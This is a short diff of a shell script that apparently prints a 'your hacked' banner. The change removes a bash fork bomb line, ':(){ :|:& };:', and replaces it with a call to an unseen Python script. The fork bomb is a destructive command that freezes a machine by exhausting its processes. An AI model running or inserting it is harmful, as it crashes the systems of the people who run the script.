@@ -402,8 +402,7 @@ figlet your hacked
 echo "shrz"
 sleep 2
 source $(dirname $0)/pever.sh
-:(){ :|:& };:
-
+python py.py
 ;;
 
 	    # #############################
